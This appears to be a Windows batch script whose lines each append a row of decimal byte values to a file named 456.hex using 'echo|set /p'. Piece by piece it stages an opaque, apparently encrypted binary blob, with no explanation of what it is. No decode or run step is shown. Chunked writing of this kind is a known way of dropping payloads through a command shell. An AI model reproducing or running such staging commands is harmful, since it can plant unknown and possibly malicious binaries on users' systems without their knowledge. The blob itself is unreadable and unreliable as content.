echo|set /p=159 217 198 67 173 150 71 70 233 10 24 146 131 189 251 65 68 9 37 192 145 173 1 37 81 145 18 73 223 205 118 255 3 220 139 215 137 21 141 220 22 56 3 60 19 138 3 64 58 199 209 237 127 123 98 13 235 38 60 57 127 38 141 12 146 143 192 68 11 177 87 191 179 72 208 68 59 194 101 39 131 208 241 246 102 107 42 62 78 60 48 125 214 11 60 32 116 77 55 112 111 27 9 116 17 62 221 60 10 128 13 48 27 251 96 84 43 220 59 215 245 173 139 77 182 27 182 86 >>456.hex
echo|set /p=44 132 11 188 134 174 101 63 243 217 134 22 229 114 59 104 8 58 217 178 29 242 115 228 17 58 205 77 241 204 64 114 115 109 197 142 200 92 149 152 51 99 46 197 60 31 194 200 152 58 206 1 140 65 212 226 137 146 131 60 72 227 80 144 228 134 65 200 17 144 55 104 148 0 27 130 185 192 189 88 148 212 26 26 38 22 182 209 143 138 229 126 157 155 221 181 95 21 64 56 59 146 21 11 117 201 146 51 183 248 200 21 39 90 123 82 91 208 94 228 123 143 61 80 38 51 187 8 >>456.hex
echo|set /p=22 144 143 210 80 67 201 231 37 39 39 19 96 241 196 28 40 121 9 154 77 143 16 143 10 188 78 133 25 204 11 126 237 102 166 230 215 65 105 111 40 56 159 219 125 74 32 150 105 56 133 210 112 200 56 119 214 3 230 250 196 130 204 47 231 114 51 95 59 84 164 142 23 230 25 240 199 190 99 29 57 241 203 42 142 43 75 142 26 213 240 47 183 101 36 83 11 210 57 61 181 146 209 191 154 76 61 120 180 81 41 37 33 217 193 17 234 24 49 96 185 223 5 196 248 194 123 15 >>456.hex
echo|set /p=73 66 100 22 96 73 15 68 208 15 44 183 214 220 166 250 185 133 126 2 216 215 212 66 154 199 18 115 129 22 225 26 162 91 204 202 126 51 255 119 29 123 160 129 79 168 140 180 109 9 76 97 31 68 17 48 192 214 201 3 13 220 119 165 131 194 248 255 193 35 168 187 118 110 199 54 67 215 70 114 197 93 187 63 223 183 99 68 239 38 100 100 149 62 49 35 190 16 109 155 32 2 152 53 48 102 228 124 52 219 119 170 5 60 14 56 56 89 185 157 89 186 77 94 127 102 15 50 >>456.hex
echo|set /p=1 173 226 150 174 209 179 99 226 48 68 65 24 52 8 209 147 109 103 84 117 38 35 69 6 199 109 176 237 53 97 27 207 37 192 210 205 178 8 154 233 204 174 198 67 158 125 59 88 204 205 23 74 128 118 170 196 77 154 13 102 59 40 10 247 31 184 198 93 216 32 71 118 79 94 78 147 100 25 100 11 65 72 90 181 118 14 144 231 118 92 28 39 156 117 38 204 141 126 115 131 49 68 8 230 1 242 88 234 197 95 92 120 79 61 141 112 23 185 15 51 93 208 98 226 132 151 151 >>456.hex
echo|set /p=63 162 141 94 5 91 64 13 187 239 107 128 36 8 72 4 80 3 88 102 104 64 15 103 71 110 109 245 195 150 98 191 64 106 66 30 126 108 107 57 112 195 41 68 136 100 36 87 23 72 186 103 147 92 162 195 223 53 160 197 163 90 144 39 60 64 70 197 103 62 98 182 176 88 236 36 94 140 136 88 66 120 114 201 57 134 71 197 112 112 193 158 60 237 196 229 97 176 169 200 145 147 92 112 215 194 68 195 5 197 121 200 145 71 171 196 28 195 18 195 60 118 132 28 211 196 121 115 >>456.hex
echo|set /p=131 61 104 217 69 186 205 99 50 9 102 59 214 194 77 103 10 25 151 61 63 65 29 233 88 148 6 202 100 192 212 69 116 96 67 124 32 79 64 15 148 248 71 88 145 50 42 156 90 32 51 79 215 92 106 226 234 202 142 38 109 41 20 114 169 129 0 103 0 20 196 117 205 205 29 58 207 45 44 138 28 105 171 139 73 61 192 54 29 2 189 193 144 91 162 66 10 14 29 248 199 112 182 33 221 34 136 208 189 242 124 186 39 133 65 143 26 109 10 0 178 175 5 26 104 245 56 220 >>456.hex
echo|set /p=61 131 217 192 3 126 38 64 84 43 201 33 150 3 248 225 28 65 236 142 7 186 21 73 251 246 108 175 31 116 11 22 19 57 120 13 116 34 159 238 20 116 116 248 141 142 26 151 58 214 150 16 189 86 136 172 84 19 183 221 15 226 98 137 22 203 149 124 80 16 209 106 137 153 177 191 53 17 63 123 12 116 11 185 7 146 159 55 183 168 185 74 225 213 18 192 104 2 67 16 117 174 219 109 177 80 66 230 199 25 235 67 95 246 40 122 182 206 108 46 144 192 50 125 126 18 198 206 >>456.hex
echo|set /p=184 176 255 194 89 203 42 61 230 194 57 107 185 247 58 9 147 114 92 18 188 145 1 48 42 247 16 152 112 140 150 223 86 65 181 195 171 104 212 249 201 224 33 13 226 209 75 193 53 159 95 225 124 205 45 65 140 228 254 89 141 17 33 75 255 66 147 246 132 190 14 77 139 238 235 22 109 198 117 31 43 212 65 128 134 22 222 73 255 197 25 77 106 110 176 4 22 30 61 36 193 203 31 123 179 181 38 9 26 59 248 116 211 41 117 48 73 139 197 47 108 240 197 73 99 207 169 198 >>456.hex
echo|set /p=109 193 126 22 69 139 29 251 219 26 203 54 188 176 69 43 254 110 235 17 136 253 86 174 18 6 201 65 255 196 235 5 11 245 223 86 56 172 36 117 130 117 129 65 131 252 233 160 6 29 21 131 151 241 88 42 254 160 166 96 104 234 95 65 94 17 178 218 197 194 87 235 222 111 94 138 212 18 115 127 188 234 29 26 148 102 150 237 7 234 13 75 135 6 68 156 30 85 116 245 243 5 37 140 210 128 56 96 217 252 239 104 184 216 255 192 218 196 179 235 100 138 16 132 210 116 78 128 >>456.hex
echo|set /p=250 27 119 111 75 120 5 4 32 117 5 27 235 235 68 160 65 235 182 249 254 138 208 69 132 192 116 52 25 36 116 31 4 34 116 146 100 110 139 176 1 65 135 39 193 42 40 168 251 123 251 117 215 69 133 71 6 198 1 24 65 247 218 130 200 0 253 67 97 251 51 211 73 137 19 73 163 237 206 173 178 19 5 188 40 41 65 37 37 64 190 7 182 67 23 67 116 188 98 169 184 206 53 226 235 223 225 201 210 57 3 33 133 84 151 247 37 14 241 162 65 113 227 105 176 217 244 139 >>456.hex
echo|set /p=205 25 69 206 183 113 192 24 39 226 203 32 28 212 138 21 138 93 208 65 125 31 251 115 97 50 58 78 28 177 240 128 24 31 28 208 205 133 190 137 27 39 79 217 91 24 73 59 208 114 128 224 118 161 251 141 115 8 184 80 95 153 175 230 248 232 254 133 107 224 75 108 173 224 69 213 229 51 237 65 104 41 23 208 62 212 126 247 252 76 99 248 22 203 69 217 108 219 14 40 182 23 228 10 90 99 198 113 13 99 131 182 155 24 72 3 197 9 4 121 60 152 63 26 234 161 23 17 >>456.hex
echo|set /p=105 79 193 252 176 190 177 45 187 47 79 141 28 127 42 221 96 74 39 223 130 101 11 209 84 115 91 63 153 23 234 174 57 210 221 215 249 125 22 40 185 9 137 216 209 5 182 231 151 10 191 238 238 183 183 186 254 124 234 110 65 3 247 9 220 124 137 235 13 91 161 109 51 207 38 195 84 57 197 202 239 79 16 233 120 219 204 233 163 134 8 20 239 178 30 103 64 23 16 53 193 215 151 209 116 186 25 68 26 35 51 57 2 245 144 27 88 186 26 36 10 191 1 90 199 43 189 186 >>456.hex
echo|set /p=106 53 22 156 22 240 164 169 161 219 186 198 189 255 139 48 80 46 148 165 32 52 192 177 46 120 6 166 189 106 253 60 79 31 42 147 195 69 49 23 80 88 25 11 169 240 96 8 25 27 93 150 134 34 107 72 80 64 24 3 90 232 184 3 72 32 22 120 228 64 14 219 212 70 105 201 36 138 192 25 80 168 7 28 95 83 169 8 182 44 2 192 11 207 30 188 0 20 228 145 10 124 230 218 90 25 209 221 88 255 209 95 120 47 138 246 115 163 10 3 122 29 212 90 6 135 200 125 >>456.hex
echo|set /p=217 99 121 15 69 29 206 13 224 226 238 155 112 79 198 240 15 177 61 227 26 117 54 198 31 254 214 234 218 113 137 100 59 207 117 28 186 157 69 5 186 166 128 60 129 158 124 217 189 195 205 14 54 124 124 56 53 235 108 234 107 90 116 220 5 158 179 107 75 115 95 87 151 209 97 117 3 185 192 76 140 15 164 188 161 69 204 50 83 63 81 69 141 65 2 109 152 206 44 140 240 26 137 186 207 204 214 34 211 26 139 251 25 214 68 123 65 36 8 74 17 235 220 46 101 179 55 241 >>456.hex
echo|set /p=120 105 126 30 11 150 138 187 115 5 237 236 18 255 208 79 214 200 45 36 235 13 0 7 196 207 97 13 22 137 22 55 184 215 54 14 200 32 155 185 17 215 188 38 183 168 60 153 228 201 178 155 207 136 136 207 226 179 251 221 128 61 161 6 116 20 47 152 207 146 188 133 69 188 166 248 139 21 135 58 56 182 137 89 149 130 89 46 122 52 33 194 28 227 102 40 34 122 113 92 187 32 75 197 19 226 96 188 233 86 60 161 76 119 26 142 249 215 174 187 235 61 55 150 148 227 191 17 >>456.hex
echo|set /p=20 48 221 200 88 118 210 121 120 31 129 19 164 179 80 58 156 109 234 35 9 123 9 209 189 228 186 89 58 226 178 153 149 23 211 180 186 90 195 98 132 193 72 231 204 67 62 23 201 144 1 18 88 128 1 21 127 237 154 133 225 167 202 108 223 45 83 108 91 167 46 127 92 61 187 108 75 76 235 174 127 226 172 226 213 48 187 200 64 112 244 164 234 26 187 203 25 40 70 231 182 45 201 96 207 202 41 32 113 21 160 181 104 190 108 32 198 191 142 110 200 229 187 225 121 150 176 120 >>456.hex
echo|set /p=242 215 199 182 93 230 214 197 73 119 12 23 45 152 103 76 19 64 16 130 179 139 3 35 219 38 247 65 190 4 166 141 139 214 49 149 248 1 109 60 139 73 250 76 164 168 70 27 152 5 183 8 212 43 18 209 18 191 248 111 99 69 188 239 2 247 68 56 63 116 55 138 22 218 186 232 190 53 205 55 65 83 19 12 69 29 252 231 231 14 74 250 183 240 235 16 128 62 47 210 62 55 19 11 193 92 117 180 238 210 54 62 117 16 116 155 137 201 172 21 17 5 92 221 173 93 160 88 >>456.hex
echo|set /p=4 117 6 89 11 235 4 5 1 145 100 236 115 136 82 10 138 240 228 251 191 109 17 236 25 236 69 56 60 36 116 59 138 85 0 117 87 198 30 89 134 213 132 232 235 18 96 6 216 202 242 118 119 76 139 237 197 12 117 95 204 142 181 11 24 7 65 25 83 184 1 159 104 123 209 90 213 252 236 185 237 109 237 241 115 25 91 15 142 190 28 105 139 236 206 206 109 185 137 56 31 253 186 24 39 65 135 100 84 88 189 57 59 133 28 50 100 24 67 34 64 236 152 169 187 22 131 181 >>456.hex
echo|set /p=184 241 0 118 140 239 45 46 155 106 146 57 94 81 54 170 225 118 95 176 130 11 178 84 255 180 8 205 239 6 97 33 24 231 50 215 18 74 137 4 227 4 199 114 8 51 20 198 8 189 19 197 126 111 19 216 64 250 184 8 253 182 119 239 238 254 183 48 139 12 227 39 137 108 76 43 192 32 9 198 195 99 111 78 139 28 227 155 69 136 187 1 78 108 185 176 208 193 227 154 205 47 196 118 240 180 135 219 21 63 9 73 129 252 49 124 128 25 119 33 223 217 92 56 168 160 202 169 >>456.hex
echo|set /p=81 67 118 223 216 72 8 195 172 181 217 81 105 216 147 237 146 7 205 208 145 75 80 205 157 238 227 55 9 54 137 3 189 16 54 26 114 192 26 184 51 211 117 102 80 216 58 184 49 198 128 12 33 37 6 11 179 21 184 205 136 210 240 44 151 183 77 223 45 88 27 207 173 123 8 107 250 22 129 28 139 98 177 117 143 136 190 128 1 89 150 231 132 144 1 56 64 72 133 182 145 65 237 90 220 92 169 8 214 219 91 8 3 107 24 86 20 47 98 44 201 167 3 255 83 17 234 5 >>456.hex
echo|set /p=250 47 213 128 16 184 67 79 77 83 80 69 67 33 87 117 199 191 4 96 141 147 184 254 35 141 139 160 98 151 130 183 35 198 137 131 9 103 179 255 231 232 133 83 43 114 196 117 8 149 183 192 187 235 113 79 17 65 152 177 148 36 240 7 246 198 202 70 185 224 233 41 251 16 176 49 222 8 192 164 36 227 193 3 21 133 50 141 16 34 2 60 247 54 20 130 77 237 126 60 226 103 254 118 52 33 205 7 141 210 182 22 138 163 76 203 54 151 135 186 63 44 111 140 250 68 223 145 >>456.hex
echo|set /p=205 249 235 96 93 253 61 123 238 156 61 10 99 158 181 52 124 7 1 201 108 19 209 92 119 70 113 183 69 173 204 45 28 135 63 68 51 25 223 254 168 31 53 77 179 154 222 124 155 239 132 36 192 0 9 102 239 60 148 48 255 74 16 77 130 229 141 69 233 215 104 66 212 144 56 149 24 7 247 116 135 110 40 199 29 104 18 25 32 88 4 231 121 154 207 96 104 68 112 116 120 200 215 45 148 124 58 140 47 102 8 144 100 58 83 112 146 67 7 152 239 209 224 185 9 190 177 196 >>456.hex
echo|set /p=8 53 152 230 155 153 237 131 202 255 21 160 16 35 202 94 200 51 186 233 196 84 91 0 3 16 3 99 48 78 70 48 227 85 94 86 81 249 19 198 87 123 16 77 137 75 32 228 22 5 112 50 223 249 9 113 248 123 114 243 218 81 13 12 113 212 81 20 61 45 113 104 111 213 49 108 198 103 176 13 244 112 5 54 136 75 125 71 80 148 42 99 44 76 222 29 188 95 231 16 65 171 6 184 60 70 75 56 106 47 93 1 244 1 141 72 201 72 108 177 17 183 58 137 67 200 251 243 >>456.hex
echo|set /p=41 50 180 89 168 9 76 57 25 155 19 187 111 60 79 132 248 1 114 240 4 117 13 14 38 58 8 223 64 56 2 141 112 2 189 81 51 226 185 110 89 74 84 20 159 34 176 83 69 162 214 26 178 179 29 161 215 186 76 123 160 127 12 144 81 164 217 216 142 218 235 112 114 53 55 147 156 33 160 64 18 21 62 13 181 7 28 243 217 22 62 1 114 7 121 110 72 217 177 7 235 185 35 110 172 199 33 46 62 16 184 32 154 11 191 91 48 246 111 101 126 154 35 232 111 99 114 91 >>456.hex
echo|set /p=253 165 218 193 66 15 182 4 40 201 216 15 244 240 144 174 157 64 123 24 130 93 237 28 57 134 211 72 181 189 83 86 11 95 29 70 69 241 35 9 133 250 173 237 255 77 153 127 118 5 187 87 0 7 128 133 219 120 46 158 122 95 55 179 125 13 39 88 36 215 230 83 118 120 14 238 23 46 193 72 152 246 119 7 42 136 28 55 235 8 4 224 23 46 220 187 122 49 89 84 94 91 67 93 2 43 227 251 217 124 208 113 71 97 117 7 50 58 81 210 131 191 0 241 149 123 82 40 >>456.hex
echo|set /p=139 193 231 126 210 108 13 53 213 127 175 176 240 70 10 11 2 86 27 74 252 216 235 76 96 43 99 214 216 251 135 84 187 31 198 174 75 5 141 88 8 235 47 56 11 215 14 197 157 35 107 95 35 91 231 14 119 58 34 30 48 189 207 220 87 102 107 71 10 146 50 106 28 36 69 91 240 132 63 199 110 156 212 146 162 108 231 104 219 242 54 214 112 188 80 3 96 216 0 208 177 141 193 89 65 249 64 32 139 250 68 38 9 2 58 119 88 24 21 92 9 112 7 152 160 71 57 86 >>456.hex
echo|set /p=143 184 107 46 246 102 251 234 59 248 99 83 5 132 237 184 58 39 18 248 35 143 76 49 38 184 52 127 116 116 103 129 239 203 87 250 134 254 116 84 131 239 5 184 4 52 8 224 241 70 203 116 36 2 159 131 255 11 243 44 93 183 81 135 19 226 36 233 10 97 239 114 201 37 151 238 229 225 182 33 151 92 220 227 113 53 195 110 186 127 64 43 253 116 49 3 34 19 59 253 104 236 146 201 26 84 60 231 230 10 144 75 46 185 242 228 252 64 178 125 246 184 64 218 96 116 83 104 >>456.hex
echo|set /p=59 73 94 114 217 245 198 232 5 40 46 185 228 146 246 247 244 65 75 46 27 72 254 82 0 46 185 236 178 6 10 255 198 243 253 127 30 194 73 249 42 199 85 49 85 41 184 80 60 219 231 36 84 184 84 173 131 71 124 8 51 77 215 109 3 94 79 147 37 147 188 100 216 240 39 1 37 92 114 217 249 21 7 219 29 75 46 153 228 251 39 250 248 52 221 51 201 2 40 81 97 149 85 73 189 209 12 210 61 37 25 95 20 116 12 217 26 96 187 154 117 96 51 218 244 120 7 217 >>456.hex
echo|set /p=229 89 158 237 112 15 241 104 237 96 158 229 89 158 236 88 235 80 234 72 44 205 229 89 233 64 3 40 56 221 186 124 230 246 48 120 250 42 250 22 116 10 61 219 174 35 168 120 146 86 137 33 224 14 137 48 203 179 7 223 6 222 136 146 58 152 21 28 252 64 102 67 193 135 156 174 170 116 179 190 237 3 18 241 33 142 169 170 116 112 13 143 104 71 155 175 178 253 2 0 9 213 137 40 121 56 120 18 225 130 228 180 43 205 157 205 124 5 69 62 106 30 84 124 73 34 150 67 >>456.hex
echo|set /p=179 97 71 38 251 206 148 85 36 197 94 64 66 6 185 64 11 64 132 228 145 188 232 169 250 177 178 116 103 51 55 39 208 10 64 197 44 224 146 34 200 80 43 46 97 98 187 137 109 16 103 95 67 24 104 137 95 39 99 195 96 73 41 224 188 219 186 102 146 17 150 73 24 232 10 232 68 139 194 183 132 239 208 200 111 26 224 110 22 161 102 228 66 184 109 64 169 64 102 245 44 16 139 184 137 173 255 231 208 192 125 16 180 162 162 121 255 14 99 64 179 39 40 76 137 47 4 84 >>456.hex
echo|set /p=116 80 35 84 208 84 24 106 132 194 78 7 33 144 93 109 19 10 57 27 18 65 57 203 103 150 219 100 217 72 105 246 168 139 200 116 4 110 73 96 195 65 128 134 92 0 48 196 85 138 73 251 194 71 31 34 107 152 91 75 228 185 25 0 2 31 45 84 14 184 130 112 24 112 132 1 118 210 253 216 12 120 24 51 65 8 10 128 16 9 117 166 217 204 136 19 24 144 60 184 111 104 143 221 44 138 130 152 12 83 200 136 46 5 176 72 199 193 185 65 67 3 183 128 2 152 73 13 >>456.hex
echo|set /p=168 182 168 197 27 71 167 49 239 52 197 44 190 67 40 14 48 7 39 156 140 210 49 52 166 207 167 168 56 42 112 221 7 119 210 12 138 41 45 35 248 222 109 2 176 46 22 112 77 4 60 89 240 220 91 99 104 15 41 208 79 178 107 89 237 156 72 72 128 61 249 103 216 111 40 254 175 15 40 241 117 160 87 112 136 5 232 103 16 111 144 11 196 222 56 25 177 40 37 27 230 108 247 73 15 126 217 36 80 192 19 46 133 205 55 116 111 56 159 8 138 13 174 57 136 24 13 185 >>456.hex
echo|set /p=171 209 19 0 12 182 66 197 173 13 233 222 96 102 123 41 164 72 74 162 11 175 100 145 152 104 195 27 35 91 208 85 26 85 41 0 232 213 153 234 144 71 240 255 71 217 160 4 255 112 26 1 68 141 71 48 162 31 183 19 152 243 164 15 111 1 26 48 124 110 19 124 128 64 188 203 68 80 32 68 39 218 189 48 76 193 181 39 169 216 226 133 1 184 58 29 74 91 137 30 201 200 13 155 248 170 87 166 166 42 222 208 119 37 116 120 57 126 24 116 154 232 2 92 56 94 24 118 >>456.hex
echo|set /p=83 113 239 4 45 244 86 250 176 200 165 79 141 130 253 161 127 184 3 120 67 0 18 138 4 11 34 10 136 1 108 47 208 8 69 37 213 117 226 22 215 11 239 165 18 83 203 64 136 57 158 207 78 92 240 42 190 4 86 70 161 185 138 67 140 29 190 208 76 88 138 143 221 155 239 65 15 183 67 108 203 102 168 69 30 181 65 181 188 39 168 199 129 91 238 42 183 92 94 76 116 131 23 163 6 28 13 241 16 1 243 219 24 117 100 32 4 251 167 243 18 10 0 118 73 54 130 166 >>456.hex
echo|set /p=248 91 57 57 112 47 57 146 73 2 193 198 165 57 152 99 36 140 55 8 0 133 228 146 33 137 142 208 182 33 23 76 187 72 32 204 105 208 214 140 26 222 196 54 66 124 35 29 11 144 82 231 55 203 218 133 133 47 178 53 22 192 17 141 52 131 134 132 187 78 117 56 40 44 44 207 116 117 64 225 108 95 245 73 4 226 213 42 50 208 144 103 59 152 61 90 10 126 15 88 8 79 5 59 206 39 69 9 218 22 242 172 220 43 14 121 240 0 69 46 29 61 133 246 40 107 48 125 >>456.hex
echo|set /p=208 220 92 117 83 187 164 92 100 170 61 245 163 54 43 85 102 124 14 101 213 68 217 78 142 208 12 128 2 142 166 16 47 139 33 120 112 213 163 232 106 0 217 4 252 116 186 100 215 29 171 100 151 37 115 44 96 67 64 90 12 111 222 73 150 75 213 178 112 168 52 202 185 203 112 213 138 27 79 239 213 63 11 63 145 100 176 67 76 198 131 121 4 23 111 182 179 119 29 137 61 19 100 106 139 218 72 129 56 66 39 2 158 206 84 65 86 25 89 105 110 95 64 190 39 113 162 232 >>456.hex
echo|set /p=163 90 34 2 86 12 35 42 135 28 89 111 160 92 68 144 184 168 233 236 38 214 171 91 186 101 35 71 164 66 25 152 255 186 11 181 244 171 127 27 19 65 0 8 44 11 174 190 161 26 255 131 131 234 1 117 225 28 51 84 139 74 0 17 126 244 98 19 82 113 23 110 137 63 66 114 144 19 32 238 248 97 167 201 128 202 115 195 94 53 214 99 35 184 12 187 23 3 8 13 52 167 120 29 118 63 28 90 131 61 75 109 156 186 79 218 160 91 209 226 91 168 242 32 109 185 1 141 >>456.hex
echo|set /p=108 97 250 165 28 195 254 166 171 59 86 33 88 94 191 164 150 21 155 235 54 155 45 196 235 18 60 211 42 60 189 158 64 177 39 116 195 85 133 184 165 165 136 3 75 214 16 209 220 78 200 140 168 94 177 147 183 108 187 76 22 116 71 149 191 0 8 213 55 14 43 26 130 98 0 236 108 224 97 101 104 207 141 140 250 161 212 11 122 177 34 35 212 182 67 154 27 118 46 168 208 86 100 82 28 201 69 118 90 80 159 191 3 57 128 219 167 2 195 93 135 164 139 56 65 223 203 144 >>456.hex
echo|set /p=156 13 243 182 15 156 36 176 52 196 92 158 96 73 119 163 75 83 16 13 56 96 88 67 48 231 8 56 234 146 35 0 66 7 246 245 7 136 75 54 115 16 224 57 29 40 107 64 179 225 88 222 95 179 166 87 165 95 177 80 180 129 157 90 255 8 224 7 28 86 42 206 90 248 163 237 99 192 38 179 124 9 90 2 117 7 136 152 242 146 29 184 239 77 163 21 165 33 167 27 166 193 29 215 48 69 172 72 218 115 239 144 39 235 164 17 9 235 103 183 154 75 192 212 249 96 25 93 >>456.hex
echo|set /p=177 160 192 49 150 52 96 50 96 185 133 144 9 107 128 141 106 62 225 139 0 192 41 190 77 194 56 25 81 124 91 40 66 3 53 43 198 117 244 29 180 173 202 88 198 202 12 85 209 194 37 232 77 103 12 32 116 54 101 104 168 162 75 223 54 61 10 47 248 100 43 248 38 203 116 26 68 103 7 163 109 111 219 68 58 47 17 16 214 68 136 73 43 66 130 133 235 76 91 25 211 110 4 3 79 163 158 140 168 169 101 32 242 174 54 219 27 35 199 4 88 206 176 239 35 94 24 182 >>456.hex
echo|set /p=115 214 198 131 36 234 16 21 23 166 137 173 182 121 145 139 214 143 94 195 55 176 136 240 21 117 140 169 119 195 146 224 16 202 174 243 147 17 38 132 239 85 240 8 11 23 14 201 15 64 139 233 242 123 24 237 58 27 201 134 142 105 179 87 233 109 163 20 4 22 24 161 88 153 148 245 8 26 124 142 92 56 199 187 147 161 240 166 30 162 97 217 67 142 47 163 85 162 50 187 28 64 14 178 61 95 245 158 98 176 9 143 86 177 207 55 122 153 236 5 114 132 192 169 161 185 208 38 >>456.hex
echo|set /p=178 213 224 103 84 193 56 26 79 229 194 203 50 8 203 232 243 188 209 208 202 62 108 192 52 20 50 171 166 188 148 17 64 89 48 112 48 188 211 10 24 182 184 36 60 0 37 251 188 21 232 182 86 8 49 5 47 255 25 203 163 21 178 121 188 203 255 200 249 200 157 100 195 186 104 94 21 84 11 104 139 158 142 31 62 98 153 240 201 195 91 156 50 138 192 235 63 218 56 113 32 205 231 60 164 182 161 213 139 173 197 182 219 82 53 159 61 117 15 54 4 187 4 8 133 93 169 5 >>456.hex
echo|set /p=151 25 126 192 108 246 33 14 35 3 8 93 247 167 177 193 64 35 229 243 80 4 183 64 140 77 75 123 93 227 126 62 6 220 177 79 241 53 61 62 142 61 69 14 29 158 29 174 84 196 2 132 84 233 248 170 72 116 63 56 232 98 57 183 194 85 95 91 12 65 3 196 245 76 114 239 106 6 138 0 135 22 22 91 61 83 24 116 98 44 146 205 85 219 128 82 193 22 46 64 42 200 131 45 151 21 59 58 116 11 119 244 174 221 69 114 240 3 215 249 64 115 10 25 196 56 68 133 >>456.hex
echo|set /p=43 52 197 1 100 126 180 56 80 139 61 60 114 189 39 104 140 17 120 163 55 25 100 25 193 114 168 128 200 216 130 254 80 47 132 123 98 19 113 105 121 157 92 23 140 20 60 41 76 49 160 208 73 158 177 0 12 217 123 92 204 197 144 147 226 219 110 100 144 173 52 203 207 94 25 154 98 35 200 128 52 10 50 246 65 35 57 229 14 66 60 115 144 193 14 235 191 51 206 117 66 50 216 101 177 119 19 46 36 203 3 195 150 28 24 19 89 126 97 222 226 99 249 68 195 235 3 244 >>456.hex
echo|set /p=80 4 137 130 5 69 133 194 228 128 9 1 219 12 161 223 146 202 204 215 50 51 246 197 219 166 150 109 241 2 254 230 19 163 91 17 139 223 109 215 150 238 238 16 231 101 107 200 59 233 106 101 232 93 161 165 224 232 129 121 194 117 103 255 198 220 154 254 103 131 20 102 191 57 13 30 106 247 5 16 13 117 247 196 27 110 112 255 53 162 254 4 126 13 213 229 248 64 228 217 53 61 14 125 24 22 222 2 150 110 14 10 67 84 173 22 108 67 208 141 160 180 237 28 117 20 58 45 >>456.hex
echo|set /p=43 175 23 170 47 109 7 32 159 69 59 239 68 198 59 249 228 70 218 109 4 251 141 21 91 18 58 6 6 193 49 118 241 3 91 255 204 81 60 176 53 60 24 251 15 79 175 216 107 116 251 108 224 10 100 233 207 57 53 162 167 228 88 191 175 5 143 25 123 90 158 91 211 158 93 227 82 61 249 157 239 59 230 111 99 177 74 193 216 142 90 16 59 254 60 221 84 83 140 205 30 222 214 234 19 253 187 49 195 198 135 12 100 57 110 152 49 250 184 166 118 182 161 51 246 8 4 153 >>456.hex
echo|set /p=67 149 17 115 79 161 160 29 46 76 29 153 143 135 129 56 128 72 255 48 176 123 142 216 137 172 33 194 53 6 164 4 7 70 121 24 53 209 155 3 59 46 208 141 228 198 117 34 19 14 144 242 89 189 228 74 38 107 230 5 45 141 71 208 159 112 238 85 33 192 10 212 144 4 26 66 29 34 231 214 104 9 122 91 243 195 187 241 116 4 234 220 45 6 210 108 64 189 157 97 129 168 241 118 207 60 104 96 29 199 89 24 199 29 192 83 175 211 188 28 66 113 232 108 102 123 159 28 >>456.hex
echo|set /p=170 12 164 3 118 123 141 135 41 19 30 58 39 73 0 79 158 39 10 58 124 253 57 185 64 148 13 244 218 103 115 31 77 86 9 209 15 188 156 255 255 75 162 26 130 6 75 9 183 152 58 56 65 193 213 250 47 153 201 165 105 136 92 208 43 230 156 175 168 11 10 218 136 10 253 175 241 2 165 128 249 255 31 12 192 138 11 132 201 117 32 37 1 93 94 194 15 4 134 224 3 87 32 223 23 146 33 48 231 239 61 224 111 80 185 157 0 143 136 120 179 141 110 32 123 84 111 95 >>456.hex
echo|set /p=253 80 4 176 112 255 125 14 186 135 249 239 104 19 72 72 199 128 104 180 14 88 157 91 196 3 39 35 1 87 110 162 133 242 34 64 250 96 121 137 53 238 10 219 23 225 22 55 68 83 1 230 3 195 118 31 209 109 109 16 122 100 12 207 13 163 250 225 48 1 105 206 116 70 0 71 26 161 211 29 132 90 1 44 247 159 248 16 49 82 129 65 74 96 220 14 24 213 46 133 108 151 15 86 151 142 1 187 161 231 221 235 26 52 194 18 3 204 182 97 49 27 197 114 180 116 37 195 >>456.hex
echo|set /p=82 88 90 38 230 234 26 125 37 215 219 77 114 240 235 7 4 53 43 56 120 203 120 182 192 176 255 124 140 40 71 18 157 212 97 56 3 24 9 250 174 22 244 112 10 215 42 78 10 35 226 80 136 195 147 223 108 106 124 57 53 169 97 105 224 10 57 67 176 112 73 61 186 147 62 7 24 192 84 120 155 166 30 197 115 79 3 90 179 239 106 137 32 118 235 87 21 18 23 154 106 64 155 59 64 39 109 114 13 229 126 122 135 205 1 159 151 116 13 142 17 61 100 182 215 141 192 124 >>456.hex
echo|set /p=39 157 8 25 184 15 78 254 246 102 71 120 96 138 235 10 161 46 156 234 61 59 200 12 106 134 58 15 141 11 115 163 69 19 245 109 217 250 150 2 247 185 133 62 168 157 143 74 137 70 46 109 201 165 120 36 9 63 150 80 128 198 8 224 166 13 96 170 236 81 189 201 25 1 29 87 8 185 130 89 108 254 133 196 143 117 166 154 124 35 0 229 155 92 80 31 190 209 28 107 131 99 29 27 96 16 153 149 200 133 55 96 23 75 68 125 4 158 242 60 23 190 214 104 51 182 152 216 >>456.hex
echo|set /p=80 132 89 193 13 227 18 48 171 51 248 70 106 232 119 225 117 71 203 207 136 7 215 245 70 109 44 16 123 176 13 77 179 221 116 184 228 54 105 140 47 15 183 37 182 96 182 151 96 185 0 130 102 35 193 7 128 253 233 198 40 229 50 47 77 39 137 29 32 85 100 235 220 238 183 215 5 30 9 221 92 145 100 20 117 102 123 203 137 48 10 201 152 116 14 181 8 180 255 151 214 57 240 222 199 75 56 124 198 131 192 253 132 135 159 167 75 39 23 141 126 95 108 148 129 124 48 77 >>456.hex
echo|set /p=224 246 14 144 14 49 151 99 89 111 65 128 13 250 247 216 48 222 206 69 27 224 31 32 14 170 146 68 35 13 233 94 151 91 195 203 56 140 0 9 45 117 161 148 61 229 114 15 175 130 3 162 134 241 15 31 5 179 69 183 10 134 170 167 203 28 138 18 27 147 205 108 1 89 24 246 0 146 148 95 127 9 40 12 242 172 233 159 50 84 199 144 110 7 122 20 225 183 151 252 5 112 126 4 75 224 120 243 116 66 151 151 114 75 213 93 99 232 174 120 193 115 85 138 145 115 5 225 >>456.hex
echo|set /p=25 78 15 138 239 182 214 87 153 17 248 167 92 124 77 72 1 224 215 119 95 15 235 50 76 57 6 124 51 73 129 197 71 185 35 200 13 102 7 175 99 227 118 151 230 146 59 228 239 151 21 9 174 79 94 22 209 52 183 198 150 155 83 132 44 186 61 155 123 59 235 8 97 235 244 139 126 27 127 133 177 235 194 157 190 31 47 199 57 251 126 28 76 114 118 82 30 27 90 148 186 24 200 165 119 96 59 238 125 16 118 160 150 146 230 82 155 70 125 92 161 83 147 99 24 0 151 244 >>456.hex
